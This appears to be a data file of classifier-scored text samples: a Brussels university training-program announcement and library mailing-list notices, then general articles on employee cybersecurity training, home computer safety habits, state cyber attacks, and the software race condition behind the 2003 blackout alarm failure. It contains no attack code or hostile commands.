wireless network. If however that is not possible, then the participant should communicate about this problem with the secretariat of the training program, as soon as possible; then the program organisers can try to rent a personal notebook computer for the participant at a reasonable price. Poster session by participants: Each participant is expected to create a poster about ongoing activities related to information management in their home institution. This poster is presented in a poster session as early as possible early in the program. In this way, participants and some professors get to know each other efficiently and the participants learn to present information in the format of a scientific poster. Therefore, participants are encouraged to bring supporting materials like folders, leaflets, photos, maps, etc… for inclusion in their poster. Scientific tutorial presentations by participants: Each participant is expected to present a tutorial presentation during the program of maximum 15 minutes, with 10 minutes of questions and answers plus discussion foreseen. The audience is composed of the other participants. The topic of each presentation is one aspect of their expertise. The aims are the following: - participants improve their scientific presentation, teaching and communication skills, - they share their knowledge with the other participants, - participants get to know each other better, - the session may form a basis for possible later co-operation, etc… Teachers, professors, experts, resource persons: The following will be invited. They may contribute as they did in previous programs, if their agenda and the limited duration of the training program allow this: \" Collier, KUL, \" Dekeyser, KUL, \" De Keyser, Hogeschool, and \" De Smet, \" Koninckx, Vrije Universiteit Brussel, Brussel, Belgium \" Holans, KUL, \" Nieuwenhuysen, Vrije Universiteit Brussel, Brussel, Belgium \" Nyssen, Vrije Universiteit Brussel, Brussel, Belgium \" Rousseau, Universiteit Antwerpen, \" Van Audenhove, Vrije Universiteit Brussel, Brussel, Belgium \" Vanderpijpen, Royal/National Library, Social and cultural activities planned: - Poster presentation by each participant to the other participants and to invited guests, about information management in their home institute, on the same evening as the welcome reception with drinks and appetizers, early in the program. - Evening with the opportunity to learn more about beer tasting and to taste some of the world-famous Belgian beers and some Belgian food. - Photography contests. - Farewell gathering with drinks and snacks. (final evening of the program) Furthermore the participants can join some of the many activities at the university and in Participation, registration=tuition fee and costs: Participation is free of charge (!) for 12 participants from developing countries. They are selected by the Steering Committee of the program, by VLIR (the Flemish Inter-university Council) section for University Co-operation VLIR-UOS, and by DGOS. They also receive a return flight ticket plus a scholarship to cover the costs of transport from the airport upon arrival to their room, accommodation, health insurance during the stay in and finally transport from their room to the airport. The detailed forms that are needed to request a grant=scholarship should be available through the Internet from the WWW site of VLIR-UOS. Their site is http://www.vliruos.be/ At the time of writing this text, the required forms, one for the request and one for the recommendation letters could be downloaded primarily from http://www.vliruos.be/index.php?navid=380&direct_to=Scholarships_Programme and from http://www.vliruos.be/index.php?navid=322&direct_to=Downloads Grant applications must be received by VLIR before the end of January! (and NOT before the end of February as in previous years up to 2005). Official and formal requests for a grant-scholarship or any other correspondence about the grants should be sent to VLIR-UOS in The ideal participant applying for a grant is younger than 40 years, and will be able to apply what has been learned directly in a professional scientific or technical environment afterwards. Besides the persons who receive a grant from the Belgian Government through VLIR, 8 persons can participate after paying a registration=tuition fee that is small in comparison with similar programs. The costs mentioned do NOT include air travel, -To participate during the full period: 2400 Euro -Exceptionally, persons who cannot participate for the whole period can nevertheless participate during 2 months only (1800 Euro) or during 1 month only (1000 Euro). It makes sense to attend for instance the first month or the first two months only. It makes less sense to participate only during the second or the third month, as introductions to some activities or topics may be missed. -To participate to particular items selected from the program: 30 Euro per half day. To register and pay the registration=tuition fee, send the form (see below) by classical mail or by private courier, together with an international bank transfer / bank cheque / bank draft, payable to University Library, Vrije Universiteit Brussel, Pleinlaan 2, B-1050 BRUSSEL, Belgium, with no need for any bank account numbers. If however this simple procedure is NOT suitable for you, then you can transfer the required sum of money to the following bank account of the Vrije Universiteit Brussel: Fortis Bank located at Warandeberg 3 in account number 001-0686459-66 or IBAN = BE07 0010 6864 5966 and do not forget (!) to mention as a remark: for internal account VOPA21 BIBLINK3 University Library STIMULATE International Training Program. The money received by the Vrije Universiteit Brussel financial department must be transferred internally; this transfer takes about 1 week, which means a delay in the registration procedure, which is better avoided. (Without your remark, the money may be not retraceable and lost.) Realize that some bank transfer costs are involved and that these should be paid besides the requested participation fee that is transferred. There is no formal deadline. However, we recommend you to register as early as possible, because \"first come, first served\": the arrival of your participation fee determines who can participate. Furthermore the later a participant is registered, the more difficult it becomes to find cheap and suitable accommodation. There is NO need to \"apply\" prior to the registration, to request permission to participate or to be accepted, from the organizers of the program or from their universities. Also there is no age limit. The decision if the program is suitable and appropriate for an interested person is to be made by that person and not by the organizers. This is similar as participation to a conference. Invitation letters can be sent on request if needed, but in principle only when the participation = registration fee has been received. This announcement is in fact an invitation. It is a waste of time to ask the organisers of the program about sponsors besides VLIR mentioned above. Participants are covered during their stay by a full medical insurance. This costs about 40 Euro per month. This is formalised as soon as possible after arrival in The organisers of this program normally book in advance a single, cheap, basic room with access to a shared kitchen, as accommodation for each participant, unless a participant writes us that he/she wants to take care of accommodation personally, for instance by staying with a friend or by renting a room that offers more luxury. Participants pay for their accommodation directly to the person or organisation providing accommodation in The cost of living in According to previous participants and in agreement with the grants provided by VLIR-UOS, 1100 Euro per month should be enough to cover all expenses, including accommodation, transport, food… How to contact the organizers? E-mail (Internet): stimulate at vub.ac.be (or in case that this does not seem to work, to Paul.Nieuwenhuysen at vub.ac.be) (change at in @ when you want to use an address) Fax 32 2 629 2693 (or 2282) Tel. 32 2 629 2629 or 32 2 629 2429 or 32 2 629 2609 Telex 61051 vubco-b STIMULATE-ITP (or Paul NIEUWENHUYSEN), University Library, Vrije Universiteit Brussel, Pleinlaan 2, B-1050 Brussels, BELGIUM The training is mainly organized at the University Library of the Vrije Universiteit Brussel. The campus is located south of the older centre of the city of http://wikitravel.org/en/Brussels http://www.agenda.be/ about events going on in http://www.disgruntled.ca/writings/brussels/ offers information on based on the experience of living there for some time http://www.eric-maerschalck.be/Brussels/bruxelles.php?log=NO offers photos made in http://www.ilotsacre.be/site/en/default_en.htm offers an interactive map and photos of http://www.sievers.nl/visitbrussels/ shows some photos made in Interesting trips are possible to places in neighbouring countries like The Netherlands and France. Therefore, participants should try to obtain also a visa for those countries (a so called Schengen-visa). Program and Steering Committee: The course director is Dr. Paul Nieuwenhuysen, professor at the Vrije Universiteit Brussel and guest professor at Universiteit Antwerpen, Science and technology librarian of the Vrije Universiteit Brussel. http://www.vub.ac.be/BIBLIO/nieuwenhuysen/professional/ An official, formal Steering Committee is composed of members from the co-operating universities in - Vrije Universiteit Brussel, - Universiteit Antwerpen - Katholieke Universiteit Leuven This Steering Committee supervises the organisation, the program and the budget. This committee reports formally to VLIR. This version is dated 2007-11-06 to STIMULATE, University Library, Vrije Universiteit Brussel, Pleinlaan 2, B-1050 BRUSSEL, I want to participate. Therefore I send this as a letter AND I pay the registration=tuition fee as described in the announcement of the International Training Program on INFORMATION. (So the following is NOT the form to apply for a grant. Use this form only when you pay the registration=tuition fee.) a. Family name (surname): ............................... (married female participants please fill in maiden-name as well as name of husband) b. First or given names (according to your official passport): .............. Personal address: ................................... Electronic mail address Telephone, fax, telex: Date of birth: Place of birth: Nationality: Sex: male / female a. Name and address of employer: ................. b. Since: ../../.. c. Position - function - specialization d. Telephone, fax, telex and/or e-mail of the employer: Education - studies: Name of institute Degree Date Knowledge of English: writing: ........ speaking: ........ reading: ....... Have you been abroad earlier? Please specify: Duties that you will carry out after returning to your country: Please book a room for me OR Do NOT book a room for me; I will take care myself of accommodation Date and signature:..................... Please include a recent photograph, as this will simplify identifying you upon arrival. TAPE publishes audio tape digitisation workflow Anne Muller [email@example.com]; on behalf of; Ecpa e-mail [firstname.lastname@example.org] Iflaemail@example.com Fri 7/03/2008 TAPE has published web-based guidelines for digitisation. They describe the digitisation workflow for analogue open reel tapes as a step by step approach for the production of digital copies from analogue tapes from a technical point of view. Most of the workflow may also be applied to audio cassettes. The workflow was written by Juha Henriksson (Finnish Jazz & Pop Archive) & Nadja Wallaszkovits The workflow is mainly aimed at newcomers in the world of audio tape digitization. It contains references to other literature and many detailed photographs. You will find the workflow at http://www.jazzpoparkisto.net/audio/ The TAPE project, Training for Audiovisual Preservation in European Commission on Preservation and Access (ECPA) c/o Royal Netherlands Academy of Arts and Sciences P.O. Box 19121, NL-1000 GC Amsterdam, The Netherlands Visiting address: Trippenhuis, Kloveniersburgwal 29, NL-1011 JV Amsterdam T ++31 - 20 - 551 08 39 F ++31 - 20 - 620 49 41 UNESCO grants USD 5,000 for information for development success stories Sjoerd Koopman [Sjoerd.Koopman@IFLA.nl] IFLA-L Mon 3/03/2008 Win US$5,000 funding for your project through IFAP Success Stories platform <http://www.unesco-ci.org/newsletter/lt/t_go.php?i=1193&e=MzUxNjE=&l=-http--www.unesco-ci.org/cgi-bin/ifapstories/page.cgi--Q-g--E-;d--E-1> UNESCO's Information for All Programme (IFAP) encourages communities using information for development to submit their success stories to the online platform where others could learn from them and adapt them to their own local situations. For more information see http://www.unesco-ci.org/cgi-bin/ifapstories/page.cgi?g=;d=1 Web Search: Multidisciplinary Perspectives firstname.lastname@example.org; on behalf of; Amanda Spink [email@example.com] firstname.lastname@example.org Mon 25/02/2008 We're pleased to announce the publication of Web Search: Multidisciplinary Perspectives in the Information Science and Knowledge Management series by Springer. Contents include contributions approaching Web search engines from philosophical, cultural, critical, legal, economic, historical, political, and information scientific perspectives. The table of contents is pasted below. More information can be found at these links: Springer: <http://www.springer.com/computer/database+management+%26+information+retrieval/book/978-3-540-75828-0 Our thanks to all the contributors! Web Search: Multidisciplinary Perspectives Part I: Introduction o Introduction (Amanda Spink and Michael Zimmer) Part II: Social, Cultural, and Philosophical Perspectives o Through the Google Goggles: Sociopolitical Bias in Search Engine Design (Alejandro Diaz) o Reconsidering the Rhizome: A Textual Analysis of Web Search Engines as Gatekeepers of the Internet (Aaron Hess) o Exploring Gendered Notions: Gender, Job Hunting and Web o Searching Ethics: The Role of Search Engines in the Distribution of Knowledge ( o The Gaze of the Perfect Search Engine: Google as an Infrastructure of Dataveillance (Michael Zimmer) Part III: Political, Legal, and Economic Perspectives o Search Engine Liability for Copyright Infringement (Brian Fitzgerald, Damien O'Brien, and Anne Fitzgerald) o Search Engine Bias and the Demise of Search Engine (Eric Goldman) o The Democratizing Effects of Search Engine Use: On Chance Exposures and Organizational Hubs (Azi Lev-On) o ‘Googling' Terrorists: Are Northern Irish Terrorists Visible on Internet Search Engines? (Paul Reilly) o The History of the Internet Search Engine: Navigational Media and the Traffic (Elizabeth Van Couvering) Part IV: Information Behavior Perspectives o Toward a Web Search Information Behavior Model (Shirlee Ann Knight and Amanda Spink) o Web Searching for Health: Theoretical Foundations and Connections to Health Related Outcomes (Mohan Dutta and Graham. Bodie) o Search Engines and Expertise about Global Issues: Well-defined Landscape or Undomesticated Wilderness? (Jenny Fry, Shefali Virkar, and Ralph Schroeder) o Conceptual Models for Search (David Hendry and Efthimis o Web Searching: A Quality Measurement Perspective (Dirk Lewandowski and Nadine Höchstötter) Part V: Conclusion o Conclusions and Further Research (Amanda Spink and Michael Michael Zimmer, PhD WORLD BOOK CAPITAL NOMINATION 2010 Sophie Felfoldi [Sophie.Felfoldi@IFLA.nl] email@example.com Fri 23/11/2007 CALL FOR APPLICATIONS FOR THE WORLD BOOK CAPITAL NOMINATION 2010 APPEL A CANDIDATURES POUR LA NOMINATION DE LA CAPITALE MONDIALE DU LIVRE 2010 PRESENTACIÓN DE CANDIDATURAS PARA LA DESIGNACIÓN DE LA CAPITAL MUNDIAL DEL LIBRO 2010: CONVOCATORIA The Selection Committee for the World Book Capital is calling for nominations for the World Book Capital 2010. The complete applications, duly substantiated, including a cover or support letter from the mayor of the candidate-city and drafted in one of UNESCO's official languages (French, English, Spanish, Russian, Arabic or Chinese), should reach UNESCO no later than Monday 31 March 2008. No application received after this date will be taken into consideration. The candidate programmes shall be aimed at promoting books and fostering reading during the period between one World Book and Copyright Day and the next (23 April). To involve all regions of the world in turn, the Selection Committee will avoid the consecutive nomination of cities from the same region. Since the 2009 title was awarded to a city of the Arab States' region ( The applicants' programme proposals will be examined in the light of the following five criteria: 1. the submission of an activity programme specifically conceived for the 2. the degree of municipal, regional, national and international involvement and the impact of the programmes. 3. the quantity and quality of one-time or ongoing activities organized by the applicant city in collaboration with national and international professional organizations representing writers, publishers, booksellers and librarians and in full respect of the various players in the book supply chain. 4. the quantity and quality of any other noteworthy projects promoting and fostering books and reading. 5. the conformity with the principles of freedom of expression, freedom to publish and to distribute information, as stated in the UNESCO Constitution as well as by Articles 19 and 27 of the Universal Declaration of Human Rights and by the Agreement on the Importation of Educational, Scientific and Cultural Materials (Florence Agreement). By presenting its application each candidate city commits itself, in case of nomination, to: 1. Associate UNESCO, as well as the three professional associations represented in the Selection Committee, in its communication and information campaign, at all levels; 2. Provide UNESCO, which will share it with all members of the Selection Committee, with a final report on the activities implemented during the nomination year. Besides, the City authorities will facilitate possible evaluation audits implemented on UNESCO's demand. The Selection Committee – operating under the auspices of UNESCO – is made up of one representative of the International Publishers Association (IPA), one representative of the International Booksellers' Federation (IBF), one representative of the International Federation of Library Associations and Institutions (IFLA) and one UNESCO representative, under the chairmanship of the President of IPA. The Committee's task is to choose a World Book Capital each year, in accordance with 31 C/Resolution 29, adopted by the UNESCO General Conference on 2 November 2001. The first World Book Capital chosen prior to the adoption of 31 C/Resolution 29 Mr Mauro Rosi Division of Arts and 1, rue Miollis Tel.: +33 1 45 68 46 33 Fax: +33 1 45 68 55 95 According to its own criteria based on operational needs, UNESCO distinguishes five regions: Africa,",
        "prob": "tensor([[0.0069, 0.9931]])"
    },
    {
        "text": "By Gail Dutton IT departments can’t ensure data security. Despite firewalls and anti-virus and anti-malware applications, cybersecurity experts say most computer systems already are infected, and there’s little IT administrators can do to prevent it. That’s the biggest surprise non-IT employees experience during computer security training. “Non-IT employees think cybersecurity isn’t their problem...and that IT has taken care of it,” notes Prenston Gale, director of information security for Dynamics Resource Corporation, which trains government agencies in cybersecurity. At one time, reliance upon the IT department was sufficient. Today, however, organizations’ security perimeter is human, and humans are the weakest link. Lone hackers have been replaced by sophisticated criminal organizations and by hacktivists (such as Anonymous) that engage in automated, advanced persistent threats (APTs) that often gain entry by exploiting end-users. All organizations are vulnerable. Attackers target small companies, as well as multinationals, and general employees, as well as senior executives. Social engineering and spear phishing are core tactics, according to the report, “When Advanced Persistent Threats Go Mainstream,” by the Security for Business Innovation Council (SBIC) and RSA. Unlike earlier scams, the e-mails or phone calls associated with social engineering appear legitimate. The Better Business Bureau (BBB) scam is an example. Companies receive an e-mail or phone call—purportedly from the BBB—alerting them about a customer complaint, along with the attached complaint form, or a case number and log-in information to a site link. Once the link is clicked, malware that steals information and destroys files is loaded onto the PC. “Social engineering attacks are based upon interacting with people pretending to be with a particular organization and then stealing information,” Gale says. “E-mail is one of biggest threat vectors.” Another attack uses thumb drives. After the Department of Homeland Security (DHS) seeded a parking lot with thumb drives in 2011, it reported that 60 percent of the devices were inserted into agency or company computers. When the thumb drives had the organization’s logo, the insertion rate jumped to 90 percent, according to network security firm Idappcom. The danger is that the drives could harbor malware or Trojans that make it easy for hackers to penetrate. When security firm Sophos analyzed 50 USB drives left on RailCorp trains in Australia, it found that 66 percent contained malware. None were encrypted. One insidious botnet (a zombie army of infected computers) attack actually cleans up host device problems, so the PC runs beautifully, and then uses it to launch distributed denial-of-service (DDoS) attacks against other systems. Active training using simulated phishing and spear-phishing (targeted) attacks, and serious gaming using situations unique to employees’ jobs are the most effective approaches to cybersecurity training. The objective is for individuals to recognize they could be responsible for major information breaches. In contrast, traditional methods such as Webinars, videos, and classroom sessions haven’t made the threat real for participants, according to the SBIC report. “Being phished isn’t a matter of being dumb. Even the late Steve Jobs (founder of Apple) fell for a spear-phishing attack,” emphasizes Rohyt Belani, adjunct professor at Carnegie Mellon University and CEO and co-founder of PhishMe. As Dave Frymier, corporate information systems officer (CISO) of Unisys, elaborates, “It’s easy to enter innocuous sites that lead to unexpected places. Employees can’t always back out, and sometimes the system is infected.” Detecting phishing depends upon noticing that something about a contact doesn’t seem right. With training, computer users become more aware of the dangers of active hyperlinks and opening attachments and links to sites that ask for sensitive information, even when the story is believable. “The best way to make training effective is to make it hands-on and interesting, and to immerse people in the experience,” Belani says. “For phishing, you don’t have to explain much.” He developed an automated way to conduct unannounced, mock phishing exercises that provide instant, targeted training to those who are susceptible to the attack. By providing training at the point of their risky behavior, people gain instant perspective and spot subsequent dangers quicker and easier. These bite-sized experiences have enough emotional stress to get employees’ attention, and present one concept at a time, such as a flashcard, for easy learning. Before beginning a program, PhishMe blasts a notice throughout the organization alerting employees that spot training will occur throughout the year in the course of their normal work. But when simulated attacks are sent, there’s no warning. PhishMe simulated attacks arrive just like any other e-mail. “On a first training run at an organization, we typically find 58 percent of the people would click a bad link in an e-mail,” Belani notes. “At 12 months, after running the campaign every two months, susceptibility is below 10 percent. The key to success is the frequent nature of the training.” The challenge for IT-which often is the unit tasked with conducting cybersecurity training-is a combination of miniscule funding, boring training methods, and failure to recognize that training non-IT staff in cybersecurity is crucial. Unisys has trained non-IT employees in cybersecurity since 2001. As Frymier says, “We focus on commonalities: what constitutes information security; why it’s important; what a breach would mean to our four main business units; and what it would mean to functions such as contracting, regulatory compliance, etc.” The jargon-free course changes at least 30 percent each year. “Last year, the course addressed encryption resources for e-mail, files, and whole disks. New content this year focuses upon phishing.” “The hidden face of the ‘Bring your own devices (BYOD)’ trend is the PC,” Frymier says. Although mobile device concerns are garnering headlines, many people access the corporate network remotely, from their home PCs in the evenings. Consequently, corporate data is stored there and on thumb drives. “Unisys solidified its security policies and guidelines with a major focus on secure BYOD,” Frymier says. The policy outlines acceptable uses of personal devices for Internet usage and corporate data in two pages of plain language, pointing out individuals’ responsibility if they put corporate data on a device the corporation doesn’t own, as well as the possible repercussions if the corporation is sued for any reason. “Employees must understand they may be required to surrender devices that hold corporate data during the legal discovery process. That happens less than 1 percent of the time, but it’s a risk,” Frymier says. Best practices are evolving, along with the threats. Randy Gross, CIO of the Computer Technology Industry Association (CompTIA), advises organizations to use up-to-date technology and to have secure tools available to employees. Then, ensure employees have internalized the risks, know how to behave on the Internet and in e-mail, and understand implications of the business’ regulations and the regulatory environment relating to data security. As a rule of thumb, Gross advises, “If you haven’t purchased it, don’t trust it.” Cybersecurity Training Strategies By Maya Yankelevich, Senior Human Capital Consultant, PDRI Who is part of the cyber workforce? All employees at every level of the organization share a responsibility to protect valuable information assets. Cybersecurity is part of every business function; it weaves throughout all aspects of daily business operations and, therefore, should be an intrinsic element of all training and development programs. A resilient organization is the result of an educated workforce and a technologically savvy infrastructure. Few organizations have a comprehensive cybersecurity workforce planning strategy in place. As key stakeholders collaborate to develop this strategy, they must address the ongoing critical shortage of cybersecurity professionals. Learning management experts then can plan and deploy training and development initiatives that are precisely aligned with the enterprise’s overarching cybersecurity strategy. Conduct a Gap Analysis After setting strategic direction, determine the critical skills and competencies that are required to achieve strategic objectives. A gap analysis can assess current workforce capabilities and deficiencies. Keep in mind that those working on the front lines of cyber defense must possess a mix of hybrid skills-communications expertise and interpersonal capabilities that supplement technical ability, enabling engagement and effective collaboration with stakeholders in other disciplines and business leaders across the organization. Working together, the chief information security officer’s team, the organization’s human capital experts, and the training organization can improve the effectiveness of workforce cybersecurity programs by spearheading initiatives that will develop the diverse and sophisticated capabilities required to combat increasingly complex cyber threats. CISOs who collaborate with their chief human capital officer (CHCO) allies will ensure that they have the resources and infrastructure in place to build, develop, and sustain a resilient and globally competitive organization. Deploy Engaging Training Programs The training organization is tasked with building and executing learning content that supports the enterprise cybersecurity strategy...teaching risk management skills to end-users and enhancing the capabilities of cyber professionals to improve business performance. Critical to consider is the knowledge and know-how needed by everyday users versus true cybersecurity professionals, and the different motivators that will lead to success for each group. Traditional end-user security awareness training programs often lack requisite accountability and vigilance. They frequently are flat and lack the necessary impact. Cybersecurity awareness is no longer optional; instead of investing scarce training dollars in standard in-house or costly offsite development programs that often don’t deliver measurable return on investment, savvy organizations offer flexible and immersive learning programs tailored to specific enterprise goals. Training content must be rich and engaging for unique cyber talent populations; the in-demand experts are motivated by challenge and looking for the next growth opportunity. For example, channel a hacker-like propensity to break code into risk reduction expertise that secures the organization’s most valuable assets in the cyber domain. Realistic hands-on training and development simulations that replicate real-world environments will not only ensure that these cyber warriors keep their skills sharp but also enable them to grow within the organization rather than pursue opportunities elsewhere. Monitor Success of Initiatives After new programs are deployed, continuously evaluate the impact of training and development efforts by measuring employee awareness, behaviors, and capabilities. Are you achieving the objectives outlined in the enterprise cybersecurity strategy? Iteratively update learning tools to ensure the ongoing effectiveness of the organization’s response to a constantly evolving threat landscape.",
        "prob": "tensor([[2.1120e-06, 1.0000e+00]])"
    },
    {
        "text": "There are some simple habits you can adopt that, if performed consistently, may dramatically reduce the chances that the information on your computer will be lost or corrupted. How can you minimize the access other people have to your information? You may be able to easily identify people who could, legitimately or not, gain physical access to your computer—family members, roommates, co-workers, members of a cleaning crew, and maybe others. Identifying the people who could gainremote access to your computer becomes much more difficult. As long as you have a computer and connect it to a network, you are vulnerable to someone or something else accessing or corrupting your information; however, you can develop habits that make it more difficult. - Lock your computer when you are away from it. Even if you only step away from your computer for a few minutes, it's enough time for someone else to destroy or corrupt your information. Locking your computer prevents another person from being able to simply sit down at your computer and access all of your information. - Disconnect your computer from the Internet when you aren't using it. The development of technologies such as DSL and cable modems have made it possible for users to be online all the time, but this convenience comes with risks. The likelihood that attackers or viruses scanning the network for available computers will target your computer becomes much higher if your computer is always connected. Depending on what method you use to connect to the Internet, disconnecting may mean disabling a wireless connection, turning off your computer or modem, or disconnecting cables. When you are connected, make sure that you have a firewall enabled (see Understanding Firewalls for more information). - Evaluate your security settings. Most software, including browsers and email programs, offers a variety of features that you can tailor to meet your needs and requirements. Enabling certain features to increase convenience or functionality may leave you more vulnerable to being attacked. It is important to examine the settings, particularly the security settings, and select options that meet your needs without putting you at increased risk. If you install a patch or a new version of the software, or if you hear of something that might affect your settings, reevaluate your settings to make sure they are still appropriate (see Understanding Patches, Safeguarding Your Data, and Evaluating Your Web Browser's Security Settings for more information). What other steps can you take? Sometimes the threats to your information aren't from other people but from natural or technological causes. Although there is no way to control or prevent these problems, you can prepare for them and try to minimize the damage. - Protect your computer against power surges and brief outages. Aside from providing outlets to plug in your computer and all of its peripherals, some power strips protect your computer against power surges. Many power strips now advertise compensation if they do not effectively protect your computer. Power strips alone will not protect you from power outages, but there are products that do offer an uninterruptible power supply when there are power surges or outages. During a lightning storm or construction work that increases the odds of power surges, consider shutting your computer down and unplugging it from all power sources. - Back up all of your data. Whether or not you take steps to protect yourself, there will always be a possibility that something will happen to destroy your data. You have probably already experienced this at least once— losing one or more files due to an accident, a virus or worm, a natural event, or a problem with your equipment. Regularly backing up your data on a CD or network reduces the stress and other negative consequences that result from losing important information (see Real-World Warnings Keep You Safe Online for more information). Determining how often to back up your data is a personal decision. If you are constantly adding or changing data, you may find weekly backups to be the best alternative; if your content rarely changes, you may decide that your backups do not need to be as frequent. You don't need to back up software that you own on CD-ROM or DVD-ROM—you can reinstall the software from the original media if necessary. Both the National Cyber Security Alliance and US-CERT have identified this topic as one of the top tips for home users. Authors: Mindi McDowell, Allen Householder",
        "prob": "tensor([[3.6519e-04, 9.9963e-01]])"
    },
    {
        "text": "There has been a marked increase in cyber attacks by State and Non-State hackerssince the Russia Georgia War of 2008.In addition to the cyber clashes resulting from Israel's Operation Cast Lead and theWeb site defacement of India's Eastern Railway, the British government hasreported thousands of cyber attacks occurring each day on its criticalinfrastructure. The French Embassies in Britain, the U.S., China, and Canada came under Chinesecyber attacks in December 2008. The government of Zimbabwe has been waging a cyber war against its oppositionparty for the past five years. As this report is being written, a 60 day U.S. cyber security review on how the U.S.government may best proceed to protect its cyberspace from a wide variety of attacks against U.S. financial infrastructure and national security threats on a dailybasis. This report aims to answer the following questions by examining three differentcyber events impacting almost a dozen nations:How effective is Social Network Analysis in Computer Network Exploitation?How critical is the ability to access black (classified) data in a cyber intelligenceeffort?Is there evidence that points to Russian government involvement in the Georgiacyber attacks of July and August 2008?1http://www.timesonline.co.uk/tol/news/uk/crime/article4592677.ece2http://intelfusion.net/wordpress/?cat=4133http://concernedafricascholars.org/the-glass-fortress/4http://news.cnet.com/8301-13578_3-10159975-38.html",
        "prob": "tensor([[2.4921e-06, 1.0000e+00]])"
    },
    {
        "text": "Tracking the Blackout bug Buried in four million lines of C code A number of factors and failings came together to make the August 14th northeastern blackout the worst outage in North American history. One of them was buried in a massive piece of software compiled from four million lines of C code and running on an energy management computer in Ohio. To nobody's surprise, the final report on the blackout released by a US-Canadian task force Monday puts most of blame for the outage on Ohio-based FirstEnergy Corp., faulting poor communications, inadequate training, and the company's failure to trim back trees encroaching on high-voltage power lines. But over a dozen of task force's 46 recommendations for preventing future outages across North America are focused squarely on cyberspace. That may have something to do with the timing of the blackout, which came three days after the relentless Blaster worm began wreaking havoc around the Internet - a coincidence that prompted speculation at the time that the worm, or the traffic it was generating in its efforts to spread, might have triggered or exacerbated the event. When US and Canadian authorities assembled their investigative teams, they included a computer security contingent tasked with looking specifically at any cybersecurity angle on the outage. In the end, it turned out that a computer snafu actually played a significant role in the cascading blackout - though it had nothing to do with viruses or cyber terrorists. A silent failure of the alarm function in FirstEnergy's computerized Energy Management System (EMS) is listed in the final report as one of the direct causes of a blackout that eventually cut off electricity to 50 million people in eight states and Canada. The alarm system failed at the worst possible time: in the early afternoon of August 14th, at the critical moment of the blackout's earliest events. The glitch kept FirstEnergy's control room operators in the dark while three of the company's high voltage lines sagged into unkempt trees and \"tripped\" off. Because the computerized alarm failed silently, control room operators didn't know they were relying on outdated information; trusting their systems, they even discounted phone calls warning them about worsening conditions on their grid, according to the blackout report. \"Without a functioning alarm system, the [FirstEnergy] control area operators failed to detect the tripping of electrical facilities essential to maintain the security of their control area,\" reads the report. \"Unaware of the loss of alarms and a limited EMS, they made no alternate arrangements to monitor the system.\" With the FirstEnergy control room blind to events, operators failed to take actions that could have prevented the blackout from cascading out of control. In the aftermath, investigators quickly zeroed in on the Ohio line-tripping as a root cause. But the reason for the alarm failure remained a mystery. Solving that mystery fell squarely on the corporate shoulders of GE Energy, makers of the XA/21 EMS in use at FirstEnergy's control center. According to interviews, a half-a-dozen workers at GE Energy began working feverishly with the utility and with energy consultants from KEMA Inc. to figure out what went wrong. The XA/21 isn't based on Windows, so it couldn't have been infected by Blaster, but the company didn't immediately rule out the possibility that the worm somehow played a role in the alarm failure. \"In the initial stages, nobody really knew what the root cause was,\" says Mike Unum, manager of commercial solutions at GE Energy. \"We spent a considerable amount of time analyzing that, trying to understand if it was a software problem, or if - like some had speculated - something different had happened.\" Sometimes working late into the night and the early hours of the morning, the team pored over the approximately one-million lines of code that comprise the XA/21's Alarm and Event Processing Routine, written in the C and C++ programming languages. Eventually they were able to reproduce the Ohio alarm crash in GE Energy's Florida laboratory, says Unum. \"It took us a considerable amount of time to go in and reconstruct the events.\" In the end, they had to slow down the system, injecting deliberate delays in the code while feeding alarm inputs to the program. About eight weeks after the blackout, the bug was unmasked as a particularly subtle incarnation of a common programming error called a \"race condition,\" triggered on August 14th by a perfect storm of events and alarm conditions on the equipment being monitoring. The bug had a window of opportunity measured in milliseconds. \"There was a couple of processes that were in contention for a common data structure, and through a software coding error in one of the application processes, they were both able to get write access to a data structure at the same time,\" says Unum. \"And that corruption lead to the alarm event application getting into an infinite loop and spinning.\" Testing for Flaws \"This fault was so deeply embedded, it took them weeks of poring through millions of lines of code and data to find it,\" FirstEnergy spokesman Ralph DiNicola said in February. After the alarm function crashed in FirstEnergy's controls center, unprocessed events began to cue up, and within half-an-hour the EMS server hosting the alarm process folded under the burden, according to the blackout report. A backup server kicked-in, but it also failed. By the time FirstEnergy operators figured out what was going on and restarted the necessary systems, hours had passed, and it was too late. This week's blackout report recommends that the U.S. and Canadian governments require all utilities using the XA/21 to check in with GE Energy to ensure \"that appropriate actions have been taken to avert any recurrence of the malfunction.\" GE Energy says that's a moot point: though the flaw has not manifested itself elsewhere, last fall the company gave its customers a patch against the bug, along with installation instructions and a utility to repair any alarm log data corrupted by the glitch. According to Unum, the company sent the package to every XA/21 customer - more than 100 utilities around the world - and offered to help install it, \"irrespective of their current support status,\" he says. The company did everything it could, says Unum. \"We text exhaustively, we test with third parties, and we had in excess of three million online operational hours in which nothing had ever exercised that bug,\" says Unum. \"I'm not sure that more testing would have revealed that. Unfortunately, that's kind of the nature of software... you may never find the problem. I don't think that's unique to control systems or any particular vendor software.\" Tom Kropp, manager of the enterprise information security program at the Electric Power Research Institute, an industry think tank, agrees. He says faulty software may always be a part of the electric grid's DNA. \"Code is so complex, that there are always going to be some things that, no matter how hard you test, you're not going to catch,\" he says. \"If we see a system that's behaving abnormally well, we should probably be suspicious, rather than assuming that it's behaving abnormally well.\" But Peter Neumann, principal scientist at SRI International and moderator of the Risks Digest, says that the root problem is that makers of critical systems aren't availing themselves of a large body of academic research into how to make software bulletproof. \"We keep having these things happen again and again, and we're not learning from our mistakes,\" says Neumann. \"There are many possible problems that can cause massive failures, but they require a certain discipline in the development of software, and in its operation and administration, that we don't seem to find. ... If you go way back to the AT&T collapse of 1990, that was a little software flaw that propagated across the AT&T network. If you go ten years before that you have the ARPAnet collapse. \"Whether it's a race condition, or a bug in a recovery process as in the AT&T case, there's this idea that you can build things that need to be totally robust without really thinking through the design and implementation and all of the things that might go wrong,\" Neumann says. Despite the absence of cyber terrorism in the blackout's genesis, the final report includes 13 recommendations focused squarely on protecting critical power-grid systems from intruders. The computer security prescriptions came after task force investigators discovered that the practices of some of the utility companies involved in the blackout created \"potential opportunities for cyber system compromise\" of EMS computers. \"Indications of procedural and technical IT management vulnerabilities were observed in some facilities, such as unnecessary software services not denied by default, loosely controlled system access and perimeter control, poor patch and configuration management, and poor system security documentation,\" reads the report. Among the recommendations, the task force says cyber security standards established by the North America Electric Reliability Council, the industry group responsible for keeping electricity flowing, should be vigorously enforced. Joe Weiss, a control system cyber security consultant at KEMA, and one of the authors of the NERC standards, says that's a good start. \"\"The NERC cyber security standards are very basic standards,\" says Weiss. \"They provide a minimum basis for due diligence.\" But so far, it seems software failure has had 